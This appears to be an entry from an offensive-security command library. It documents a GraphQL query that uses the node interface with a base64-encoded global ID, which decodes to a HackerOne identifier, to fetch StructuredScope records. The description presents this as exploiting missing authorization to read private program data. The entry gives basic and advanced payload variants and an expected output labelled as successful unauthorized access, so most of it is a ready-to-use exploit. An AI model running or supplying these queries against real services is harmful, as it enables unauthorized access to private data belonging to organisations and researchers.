---
id: cmd-uuid-graphql-781150
data: >-
  query { node(id: "Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS8x") { ... on
  StructuredScope { _id asset_identifier asset_type } } }
tags:
  - graphql
  - query
  - access
type: command
output: null
executor: graphql
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.568Z'
verified: false
validated: true
submitted: true
---
# graphql-query-fetch-structuredscope

## Command

```graphql
query { node(id: "Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS8x") { ... on StructuredScope { _id asset_identifier asset_type } } }
```

## Description

GraphQL query to fetch a StructuredScope object via the node interface using its base64-encoded global ID, exploiting missing authorization to access private program data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| id | Base64-encoded global ID of the StructuredScope (e.g., Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS8x) | Yes |
| ... on StructuredScope | Fragment specifying fields like _id, asset_identifier, asset_type | Yes |

## Examples

### Basic Usage

```graphql
query { node(id: "Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS8x") { ... on StructuredScope { _id asset_identifier asset_type } } }
```

### Advanced Usage

```graphql
query { node(id: "Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS8y") { ... on StructuredScope { _id asset_identifier asset_type instructions } } }
```

## Expected Output

JSON response with data.node exposing StructuredScope fields, e.g., {"data":{"node":{"_id":"1","asset_identifier":"private-scope","asset_type":"URL"}}}, indicating successful unauthorized access.

## Related

- [[procedures/Exploit-GraphQL-Node-Interface-for-StructuredScope-Access]]
